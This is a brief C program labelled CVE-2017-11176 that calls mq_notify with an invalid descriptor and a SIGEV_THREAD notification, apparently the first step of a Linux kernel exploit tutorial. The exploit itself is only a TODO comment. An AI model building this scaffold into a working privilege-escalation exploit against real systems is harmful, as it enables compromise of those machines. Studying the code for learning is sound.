#include <mqueue.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>

#define NOTIFY_COOKIE_LEN 32

int main(){
  struct sigevent sigev;
  char sigval_buffer[NOTIFY_COOKIE_LEN];
  printf("-= { CVE-2017-11176 } =-\n");
  
  memset(&sigev, 0, sizeof(sigev));
  sigev.sigev_notify = SIGEV_THREAD; 
  sigev.sigev_value.sival_ptr = sigval_buffer;

  if(mq_notify((mqd_t)-1, &sigev)){
    perror("mqnotify");
    goto fail;
  }
  printf("mqnotify succeed\n");
  // TODO: exploit 
  return 0;

fail:
  printf("exploit failed!\n");
  return -1;
}
